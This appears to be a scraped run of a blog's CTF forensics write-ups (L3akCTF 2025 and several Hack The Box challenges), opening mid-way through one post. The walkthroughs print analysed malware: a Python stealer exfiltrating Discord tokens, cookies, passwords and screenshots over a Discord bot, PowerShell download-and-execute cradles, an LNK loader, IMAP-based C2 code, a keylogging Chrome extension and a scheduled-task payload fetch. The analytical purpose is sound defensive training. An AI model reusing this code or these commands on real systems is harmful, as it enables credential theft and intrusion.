Crypto.Cipher import ARC4 screenshot = ImageGrab.grab() screenshot_path = os.getenv(\u0026#39;ProgramData\u0026#39;) + r\u0026#39;\\pay2winflag.jpg\u0026#39; screenshot.save(screenshot_path) with open(screenshot_path, \u0026#39;rb\u0026#39;) as f: image_data = f.read() key = b\u0026#39;tralalero_tralala\u0026#39; cipher = ARC4.new(key) encrypted_data = cipher.encrypt(image_data) encrypted_path = screenshot_path + \u0026#39;.enc\u0026#39; with open(encrypted_path, \u0026#39;wb\u0026#39;) as f: f.write(encrypted_data) await channel.send(f\u0026#34;Screenshot from {hostname} (Pay $500 for the key)\u0026#34;, file=discord.File(encrypted_path)) except Exception as e: print(f\u0026#34;Error taking screenshot: {e}\u0026#34;) try: zname = r\u0026#39;C:\\ProgramData\\passwords.zip\u0026#39; newzip = zipfile.ZipFile(zname, \u0026#39;w\u0026#39;) newzip.write(r\u0026#39;C:\\ProgramData\\passwords.txt\u0026#39;) newzip.close() await channel.send(f\u0026#34;Passwords from {hostname}\u0026#34;, file=discord.File(zname)) except Exception as e: print(f\u0026#34;Error with password file: {e}\u0026#34;) try: usr = os.getenv(\u0026#34;UserName\u0026#34;) keys = subprocess.check_output(\u0026#39;wmic path softwarelicensingservice get OA3xOriginalProductKey\u0026#39;).decode().split(\u0026#39;\\n\u0026#39;)[1].strip() types = subprocess.check_output(\u0026#39;wmic os get Caption\u0026#39;).decode().split(\u0026#39;\\n\u0026#39;)[1].strip() except Exception as e: print(f\u0026#34;Error getting system info: {e}\u0026#34;) usr = \u0026#34;Unknown\u0026#34; keys = \u0026#34;Unknown\u0026#34; types = \u0026#34;Unknown\u0026#34; cookie = [\u0026#34;.ROBLOSECURITY\u0026#34;] cookies = [] limit = 2000 roblox = \u0026#34;No Roblox cookies found\u0026#34; try: cookies.extend(list(steal.chrome())) except Exception as e: print(f\u0026#34;Error stealing Chrome cookies: {e}\u0026#34;) try: cookies.extend(list(steal.firefox())) except Exception as e: print(f\u0026#34;Error stealing Firefox cookies: {e}\u0026#34;) try: for y in cookie: send = str([str(x) for x in cookies if y in str(x)]) chunks = [send[i:i + limit] for i in range(0, len(send), limit)] for z in chunks: roblox = f\u0026#39;```{z}```\u0026#39; except Exception as e: print(f\u0026#34;Error processing cookies: {e}\u0026#34;) embed = discord.Embed(title=f\u0026#34;Data from {hostname}\u0026#34;, description=\u0026#34;A victim\u0026#39;s data was extracted, here\u0026#39;s the details:\u0026#34;, color=discord.Color.blue()) embed.add_field(name=\u0026#34;Windows Key\u0026#34;, value=f\u0026#34;User: {usr}\\nType: {types}\\nKey: {keys}\u0026#34;, inline=False) embed.add_field(name=\u0026#34;Roblox Security\u0026#34;, value=roblox[:1024], inline=False) embed.add_field(name=\u0026#34;Tokens\u0026#34;, value=message[:1024], inline=False) await channel.send(embed=embed) with open(r\u0026#39;C:\\ProgramData\\system_info.json\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: json.dump(system_info, f, indent=4, ensure_ascii=False) await channel.send(file=discord.File(r\u0026#39;C:\\ProgramData\\system_info.json\u0026#39;)) try: os.remove(r\u0026#39;C:\\ProgramData\\pay2winflag.jpg\u0026#39;) os.remove(r\u0026#39;C:\\ProgramData\\pay2winflag.jpg.enc\u0026#39;) os.remove(r\u0026#39;C:\\ProgramData\\passwords.zip\u0026#39;) os.remove(r\u0026#39;C:\\ProgramData\\passwords.txt\u0026#39;) os.remove(r\u0026#39;C:\\ProgramData\\system_info.json\u0026#39;) except Exception as e: print(f\u0026#34;Error cleaning up: {e}\u0026#34;) BOT_TOKEN = \u0026#34;\u0026lt;redacted\u0026gt;\u0026#34; CHANNEL_ID = \u0026lt;redacted\u0026gt; if __name__ == \u0026#34;__main__\u0026#34;: bot.run(BOT_TOKEN) Overview of leak.py:\nSteals: Discord tokens, saved browser passwords, cookies, system info, and screenshots. Exfiltration: Sends all captured data via Discord bot to channel on the LobsterLeaks server. Cleanup: Deletes evidence such as screenshots and temporary files. RC4 Screenshot Encryption (2nd part of flag) # In this block:\ntry: from PIL import ImageGrab from Crypto.Cipher import ARC4 screenshot = ImageGrab.grab() screenshot_path = os.getenv(\u0026#39;ProgramData\u0026#39;) + r\u0026#39;\\pay2winflag.jpg\u0026#39; screenshot.save(screenshot_path) with open(screenshot_path, \u0026#39;rb\u0026#39;) as f: image_data = f.read() key = b\u0026#39;tralalero_tralala\u0026#39; cipher = ARC4.new(key) encrypted_data = cipher.encrypt(image_data) encrypted_path = screenshot_path + \u0026#39;.enc\u0026#39; with open(encrypted_path, \u0026#39;wb\u0026#39;) as f: f.write(encrypted_data) await channel.send(f\u0026#34;Screenshot from {hostname} (Pay $500 for the key)\u0026#34;, file=discord.File(encrypted_path)) The screenshot is encrypted using RC4 with the key tralalero_tralala. With this key, we can decrypt the pay2winflag.jpg.enc file from the LobsterLeaks server using CyberChef and retrieve the second part of the flag. Finding the First Part of the Flag # Initially, I assumed the first part of the flag would be part of the exfiltrated data (like cookies) — no luck. I then checked the wallpaper for steganography, but again, nothing. But after touching some grass, I came back and look through the first stage and second stage payload. Only then I start to look into the WindowsSecure.bat 😭as I thought it was just usual ASEP.\nWindowsSecure.bat # As usual, there\u0026rsquo;s BOM at the front of the script. After stripping it, the script seems to be having string obfuscation. I defined the variables in a terminal and echoed out the strings to reveal the first part of the flag and confirm the persistence mechanism. Final Flag # Combining both parts retrieved from:\nWindowsSecure.bat (first part) RC4-decrypted screenshot (second part) Shoutout to warlocksmurf for authoring this 🔥 challenge.\nLesson learnt: Don\u0026rsquo;t forget the ASEPs\n","date":"14 July 2025","externalUrl":null,"permalink":"/posts/l3akctf-2025/","section":"Posts","summary":"This page contains L3akCTF 2025 writeups, covering Ghost In The Dark and BOMbardino crocodile challenges in the forensics category.","title":"L3akCTF 2025","type":"posts"},{"content":" Forensics # Thorin’s Amulet # Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.\nFlag: HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}\nChallenge File: artifact.ps1 # function qt4PO { if ($env:COMPUTERNAME -ne \u0026#34;WORKSTATION-DM-0043\u0026#34;) { exit } powershell.exe -NoProfile -NonInteractive -EncodedCommand \u0026#34;SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=\u0026#34; } qt4PO Step 1: Decoding the Base64 Payload # The script contains a Base64-encoded PowerShell command. Decoding it using CyberChef reveals:\nIEX (New-Object Net.WebClient).DownloadString(\u0026#34;http://korp.htb/update\u0026#34;) This command downloads and executes a script from http://korp.htb/update.\nStep 2: Fetching the Update Script # After adding the Docker instance’s IP to /etc/hosts, we fetch the /update endpoint:\n┌──(kali㉿kali)-[~] └─$ curl http://korp.htb:54742/update function aqFVaq { Invoke-WebRequest -Uri \u0026#34;http://korp.htb/a541a\u0026#34; -Headers @{\u0026#34;X-ST4G3R-KEY\u0026#34;=\u0026#34;5337d322906ff18afedc1edc191d325d\u0026#34;} -Method GET -OutFile a541a.ps1 powershell.exe -exec Bypass -File \u0026#34;a541a.ps1\u0026#34; } aqFVaq Step 3: Retrieving the Secondary Payload # Modifying the script to match the Docker port and fetching a541a.ps1:\n┌──(kali㉿kali)-[~] └─$ curl -H \u0026#34;X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d\u0026#34; http://korp.htb:54742/a541a $a35 = \u0026#34;4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d\u0026#34; ($a35-split\u0026#34;(..)\u0026#34;|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join \u0026#34;\u0026#34; Step 4: Decoding the Hex Payload # The script converts a hex string to ASCII. Using CyberChef:\nA new Hire # The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.\nFlag: HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}\nPhishing Email Analysis # We\u0026rsquo;re given an EML file containing a job application phishing email. The email includes a link for the recipient to access: Initial Investigation # Hosts File Modification: Added the Docker instance IP to /etc/hosts to access the domain.\nPage Source Analysis: Found an interesting script in the page resources:\n\u0026lt;script defer=\u0026#34;defer\u0026#34;\u0026gt; setTimeout(() =\u0026gt; { document.getElementById(\u0026#39;loading\u0026#39;).style.display = \u0026#39;none\u0026#39;; document.getElementById(\u0026#39;main-content\u0026#39;).style.display = \u0026#39;flex\u0026#39;; }, 5000); function getResume() { window.location.href=`search:displayname=Downloads\u0026amp;subquery=\\\\\\\\${window.location.hostname}@${window.location.port}\\\\3fe1690d955e8fd2a0b282501570e1f4\\\\resumes\\\\`; } \u0026lt;/script\u0026gt; Malicious Shortcut Discovery # The script navigates to:\nhttp://storage.microsoftcloudservices.com:41275/3fe1690d955e8fd2a0b282501570e1f4/resumes This directory contains a malicious shortcut disguised as Resume.pdf.lnk: LNK File Analysis # Used Eric Zimmerman\u0026rsquo;s LECmd to parse the shortcut file, revealing the following arguments:\nArguments: /c powershell.exe -W Hidden -nop -ep bypass -NoExit -E WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBtAHMAZQBkAGcAZQAnACwAIAAnAGgAdAB0AHAAOgAvAC8AcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQA6ADQANAAwADkANAAvADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANAAvAHIAZQBzAHUAbQBlAHMAUwAvAHIAZQBzAHUAbQBlAF8AbwBmAGYAaQBjAGkAYQBsAC4AcABkAGYAJwApADsAXABcAHMAdABvAHIAYQBnAGUALgBtAGkAYwByAG8AcwBvAGYAdABjAGwAbwB1AGQAcwBlAHIAdgBpAGMAZQBzAC4AYwBvAG0AQAA0ADQAMAA5ADQAXAAzAGYAZQAxADYAOQAwAGQAOQA1ADUAZQA4AGYAZAAyAGEAMABiADIAOAAyADUAMAAxADUANwAwAGUAMQBmADQAXABwAHkAdABoAG8AbgAzADEAMgBcAHAAeQB0AGgAbwBuAC4AZQB4AGUAIABcAFwAcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQBAADQANAAwADkANABcADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANABcAGMAbwBuAGYAaQBnAHMAXABjAGwAaQBlAG4AdAAuAHAAeQA= Decoding the Payload # The Base64-encoded command decodes to:\n[System.Diagnostics.Process]::Start(\u0026#39;msedge\u0026#39;, \u0026#39;http://storage.microsoftcloudservices.com:44094/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf\u0026#39;); \\\\storage.microsoftcloudservices.com@44094\\3fe1690d955e8fd2a0b282501570e1f4\\python312\\python.exe \\\\storage.microsoftcloudservices.com@44094\\3fe1690d955e8fd2a0b282501570e1f4\\configs\\client.py Python Script Analysis # The client.py script contains:\nimport base64 key = base64.decode(\u0026#34;SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==\u0026#34;) data = base64.b64decode(\u0026#34;c97FeXRj6jeG5P74ANItMBNAPIlhyeTnf9gguC3OwmDQHdacg769Y...) meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))]) exec(zlib.decompress(meterpreter_data)) Flag Extraction # The key variable contains a Base64-encoded string. Decoding it using CyberChef reveals the flag:\nHTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!} Silent Trap # A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers\u0026rsquo; and system administrators\u0026rsquo; computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it\u0026rsquo;s too late.\nFlags:\n1. What is the subject of the first email that the victim opened and replied to? Game Crash on Level 5 2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34) 2025-02-24_15:46 3. What is the MD5 hash of the malware file? c0b37994963cc0aadd6e78a256c51547 4. What credentials were used to log into the attacker\u0026#39;s mailbox? (Format: username:password) proplayer@email.com:completed 5. What is the name of the task scheduled by the attacker? Synchronization 6. What is the API key leaked from the highly valuable file discovered by the attacker? sk-3498fwe09r8fw3f98fw9832fw Initial Investigation # We\u0026rsquo;re given a capture.pcapng containing email communications. After extracting all HTTP objects, we find multiple HTML-formatted emails: Email Analysis # 1. First Email (Victim\u0026rsquo;s Reply) # Found via filename containing *_action=compose:\nSubject: Game Crash on Level 5 (Answer to Q1) 2. Suspicious Email # Found via filename containing *_action=preview:\nSubject: Bug Report - In-game Imbalance Issue in Eldoria Timestamp: 2025-02-24_15:46 (Answer to Q2) Malware Extraction # Zip File Retrieval # Found via filename containing *_download=1:\nPassword: eldoriaismylife (from attacker\u0026rsquo;s email) File Analysis # ┌──(kali㉿kali)-[~/Desktop/Silent Trap/extracted_http_objects] └─$ md5sum Eldoria_Balance_Issue_Report.pdf.exe c0b37994963cc0aadd6e78a256c51547 # Answer to Q3 ┌──(kali㉿kali)-[~/Desktop/Silent Trap/extracted_http_objects] └─$ file Eldoria_Balance_Issue_Report.pdf.exe Eldoria_Balance_Issue_Report.pdf.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly Complete Malware Code Analysis (dnSpy) # 1. Persistence Mechanism # string text = \u0026#34;move /Y email.exe \\\u0026#34;C:\\\\Users\\\\%username%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\email.exe\\\u0026#34;\u0026#34;; 2. C2 Communication # private static void connect(string server, int port) { try { Program.tcp = new TcpClient(server, port); Program.ssl = Program.tcp.GetStream(); } catch { return; } } private static void Login(string login, string password) { byte[] bytes = Encoding.ASCII.GetBytes(string.Concat(new string[] { \u0026#34;$ LOGIN \u0026#34;, login, \u0026#34; \u0026#34;, password, \u0026#34;\\r\\n\u0026#34; })); Program.ssl.Write(bytes, 0, bytes.Length); byte[] array = new byte[512]; Program.ssl.Read(array, 0, 512); } 3. Complete XOR Encryption Implementation # public class Exor { public static byte[] Encrypt(byte[] pwd, byte[] data) { int[] array = new int[256]; int[] array2 = new int[256]; byte[] array3 = new byte[data.Length]; int i; for (i = 0; i \u0026lt; 256; i++) { array[i] = (int)pwd[i % pwd.Length]; array2[i] = i; } int num; for (i = (num = 0); i \u0026lt; 256; i++) { num = (num + array2[i] + array[i]) % 256; int num2 = array2[i]; array2[i] = array2[num]; array2[num] = num2; } int num3; num = (num3 = (i = 0)); while (i \u0026lt; data.Length) { num3++; num3 %= 256; num += array2[num3]; num %= 256; int num2 = array2[num3]; array2[num3] = array2[num]; array2[num] = num2; int num4 = array2[(array2[num3] + array2[num]) % 256]; array3[i] = (byte)((int)data[i] ^ num4); i++; } return array3; } } public static byte[] xor(byte[] data) { return Exor.Encrypt(new byte[] { 168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164, 238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44, 30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163, 229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243, 55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66, 111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49, 126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227, 25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38, 72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72, 162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225, 246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190, 182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204, 118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6, 241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145, 185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203, 227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159 }, data); } 4. Command Execution # private static void execute(string[] commands) { try { Program.connect(Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[2], 143); Program.Login(Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[0], Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[1]); } catch { try { // Fallback connection attempt } catch { } } foreach (string text in commands) { if (text.Contains(\u0026#34;change_\u0026#34;)) { Program.change(text); } else { string text2 = Program.cmd(text); text2 = Convert.ToBase64String(Program.xor(Encoding.UTF8.GetBytes(text2))); Program.create(text2); } } } 5. File Operations # private static string[] readFile() { Program.connect(Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[2], 143); Program.Login(Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[0], Program.creds.Split(new char[] { \u0026#39;:\u0026#39; })[1]); try { Program.selectFolder(\u0026#34;Drafts\u0026#34;); } catch { Program.selectFolder(\u0026#34;INBOX.Drafts\u0026#34;); } string[] array = Program.searchMessages(Program.comp_id); if (array.Length == 0) { return new string[0]; } string text = array[array.Length - 1]; string text2 = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; array.Length; i++) { byte[] array2 = Program.xor(Convert.FromBase64String(Program.getMessage(text))); text2 = Encoding.UTF8.GetString(array2); } string[] array3 = new string[0]; foreach (string text3 in text2.Split(new char[] { \u0026#39;\\n\u0026#39; })) { if (!text3.Contains(\u0026#34; OK\u0026#34;) \u0026amp;\u0026amp; text3.Length \u0026gt; 1) { Array.Resize\u0026lt;string\u0026gt;(ref array3, array3.Length + 1); array3[array3.Length - 1] = text3.Trim(new char[] { \u0026#39;\\r\u0026#39; }).Trim(new char[] { \u0026#39;)\u0026#39; }); } } return array3; } 6. Main Initialization # static Program() { string[] array = new string[5]; array[0] = Environment.MachineName; array[1] = \u0026#34;_\u0026#34;; array[2] = Environment.UserName; array[3] = \u0026#34;_\u0026#34;; int num = 4; OperatingSystem osversion = Environment.OSVersion; array[num] = ((osversion != null) ? osversion.ToString() : null); Program.comp_id = Program.Base64Encode(string.Concat(array)); Program.creds = \u0026#34;proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000\u0026#34;; Program.r_creds = \u0026#34;proplayer1@email.com:completed:mail.korptech.net:000000000000000000000000000000000000000000000000000000000\u0026#34;; Program.ssl = null; Program.tcp = null; } Network Traffic Analysis # 1. Tshark Command for IMAP Data # tshark -r capture.pcapng -Y \u0026#39;imap contains \u0026#34;APPEND Inbox\u0026#34;\u0026#39; -T fields -e imap.request | grep -oP \u0026#39;PM_report_[^,]+\\K,[A-Za-z0-9+/=]+\u0026#39; | cut -c2- \u0026gt; output.txt Sample output:\nVGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0PKHVKjXgoGdmRJd2PDG7SWRcBDwNp8EC7UfDTqZp7EDWJYUJuBLfFYh4tpc/MCfKw++nXu5YZ/FWE9pkrWq4= VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0VL2xOwD58M8+JNMSMUH/CSVV/KFxDiECrU/Pg/psFf0rtQxVXdJjhYB01oN7beNOq6vTRp4UZ9VmU74I3RfZTpCKkuGpF8lbct/WB0KYOKTz9M/MJnadATIYB6mIGCBnalXAGG+rtciH78pb9BIMAK3cAnRO1lUs6XwNZyX/2J5npVXt4FRZihG54E8+wp3c= 2. Complete Python Decryption Script # import base64 import argparse def xor_encrypt_decrypt(key, data): # Initialize the arrays array = [key[i % len(key)] for i in range(256)] array2 = list(range(256)) array3 = bytearray(len(data)) # Key Scheduling Algorithm (KSA) j = 0 for i in range(256): j = (j + array2[i] + array[i]) % 256 array2[i], array2[j] = array2[j], array2[i] # Pseudo-Random Generation Algorithm (PRGA) i = j = 0 for k in range(len(data)): i = (i + 1) % 256 j = (j + array2[i]) % 256 array2[i], array2[j] = array2[j], array2[i] t = (array2[i] + array2[j]) % 256 keystream_byte = array2[t] array3[k] = data[k] ^ keystream_byte return bytes(array3) def process_file(file_path, key): try: with open(file_path, \u0026#39;r\u0026#39;) as file: for line in file: base64_input = line.strip() if base64_input: try: decoded_data = base64.b64decode(base64_input) decrypted_data = xor_encrypt_decrypt(key, decoded_data) try: decrypted_text = decrypted_data.decode(\u0026#39;utf-8\u0026#39;) print(f\u0026#34;\\nDecrypted Data (Base64: ...{base64_input[-10:]}):\\n {decrypted_text}\\n-+-+-+-+-+-+-+-+-+-+\u0026#34;) except UnicodeDecodeError: print(f\u0026#34;\\nThe decrypted data from Base64 {base64_input[:10]}... could not be decoded as UTF-8.\\n-+-+-+-+-+-+-+-+-+-+\u0026#34;) except base64.binascii.Error: print(f\u0026#34;Invalid Base64 encoding found in line: {base64_input[:10]}...\\n-+-+-+-+-+-+-+-+-+-+\u0026#34;) else: print(\u0026#34;Empty line detected, skipping.\\n-+-+-+-+-+-+-+-+-+-+\u0026#34;) except FileNotFoundError: print(f\u0026#34;File not found: {file_path}\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;Decrypt Base64-encoded data using XOR encryption.\u0026#34;) parser.add_argument(\u0026#39;file_path\u0026#39;, help=\u0026#34;Path to the file containing Base64 encoded data.\u0026#34;) args = parser.parse_args() key = bytearray([ 168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164, 238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44, 30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163, 229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243, 55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66, 111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49, 126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227, 25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38, 72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72, 162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225, 246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190, 182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204, 118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6, 241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145, 185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203, 227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159 ]) process_file(args.file_path, key) if __name__ == \u0026#34;__main__\u0026#34;: main() Decrypted Command Outputs # Decrypted Data (Base64: ...HsvGi0r9g=): Microsoft Windows [Version 10.0.19045.5487] (c) Microsoft Corporation. All rights reserved. C:\\Users\\dev-support\\Desktop\u0026gt;schtasks /create /tn Synchronization /tr \u0026#34;powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\\Temp\\rakalam.exe\u0026#34; /sc minute /mo 1 /ru SYSTEM Decrypted Data (Base64: ...0ftml7fg==): Microsoft Windows [Version 10.0.19045.5487] (c) Microsoft Corporation. All rights reserved. C:\\Users\\dev-support\\Desktop\u0026gt;more C:\\backups\\credentials.txt [Database Server] host=db.internal.korptech.net username=dbadmin password=rY?ZY_65P4V0 [Game API] host=api.korptech.net api_key=sk-3498fwe09r8fw3f98fw9832fw [SSH Access] host=dev-build.korptech.net username=devops password=BuildServer@92|7Gy1lz\u0026#39;Xb port=2022 Stealth Invasion # Selene\u0026rsquo;s normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.\nFlags:\n1. What is the PID of the Original (First) Google Chrome process: 4080 2. What is the only Folder on the Desktop malext 3. What is the Extention\u0026#39;s ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm) nnjofihdjilebhiiemfmdlpbdkbjcpae 4. After examining the malicious extention\u0026#39;s code, what is the log filename in which the data is stored 5. What is the URL the user navigated to drive.google.com 6. What is the password of selene@rangers.eldoria.com clip-mummify-proofs 1. Initial Processing with MemProcFS # MemProcFS.exe -f memdump.elf -forensic 1 2. Process Analysis (Question 1) # Location: sys\\proc\\proc.txt\nFirst Chrome Process Found:\n--- chrome.exe 4080 5296 U* selene 2025-03-13 17:01:04 UTC *** Answer: 4080\n3. Desktop Contents (Question 2) # Location: forensic\\files\\ROOT\\Users\\selene\\Desktop\nDirectory Listing: Answer: malext\n4. Malicious Extension Analysis # a. Extension Code (background.js) # function addLog(s) { if (s.length != 1 \u0026amp;\u0026amp; s !== \u0026#34;Enter\u0026#34; \u0026amp;\u0026amp; !s.startsWith(\u0026#34;PASTE\u0026#34;)) { s = `|${s}|`; } else if (s === \u0026#34;Enter\u0026#34; || s.startsWith(\u0026#34;PASTE\u0026#34;)) { s = s + \u0026#34;\\r\\n\u0026#34;; } chrome.storage.local.get([\u0026#34;log\u0026#34;]).then((data) =\u0026gt; { if (!data.log) { data.log = \u0026#34;\u0026#34;; } data.log += s; chrome.storage.local.set({ \u0026#39;log\u0026#39;: data.log }); }); } chrome.runtime.onConnect.addListener((port) =\u0026gt; { console.assert(port.name === \u0026#34;conn\u0026#34;); console.log(\u0026#34;v1.2.1\u0026#34;); port.onMessage.addListener( ({ type, data }) =\u0026gt; { if (type === \u0026#39;key\u0026#39;) { addLog(data); } else if (type == \u0026#39;paste\u0026#39;) { addLog(\u0026#39;PASTE:\u0026#39; + data); } }); }); chrome.runtime.onMessage.addListener( function(request, sender, sendResponse) { if (request.check === \u0026#34;replace_html\u0026#34; \u0026amp;\u0026amp; chrome.storage.local.get(\u0026#34;replace_html\u0026#34;)) { sendResponse({ url: chrome.storage.local.get(\u0026#39;replace_html_url\u0026#39;)}); } } ); b. Extension Location # Path: forensic\\files\\ROOT\\Users\\selene\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nnjofihdjilebhiiemfmdlpbdkbjcpae\nExtension ID Found: Answer: nnjofihdjilebhiiemfmdlpbdkbjcpae\n5. Keylogger Log Analysis # a. Log File Location # Found in extension storage: 000003.log\nb. Log Contents # Key findings:\nVisited URL: drive.google.com Captured Password: clip-mummify-proofs Cave Expedition # Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?\nFlag: HTB{Dunl0rn_dRAk3_LA1r_15_n0W_5AF3}\nInitial Investigation # Using Chainsaw to analyze EVTX logs:\nchainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Users\\flare\\Desktop\\forensics_cave_expedition\\Logs -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv -o C:\\Users\\flare\\Desktop\\forensics_cave_expedition\\Logs\\logs.csv Suspicious Activity Found # Non-interactive PowerShell process spawned: Malicious Batch Script Execution # ParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \u0026#34;\u0026#34;C:\\Users\\developer56546756\\Desktop\\avAFGrw41.bat\u0026#34;\u0026#34; ParentUser: WORKSTATION5678\\developer56546756 ParentProcessId: 5364 ParentImage: C:\\Windows\\System32\\cmd.exe 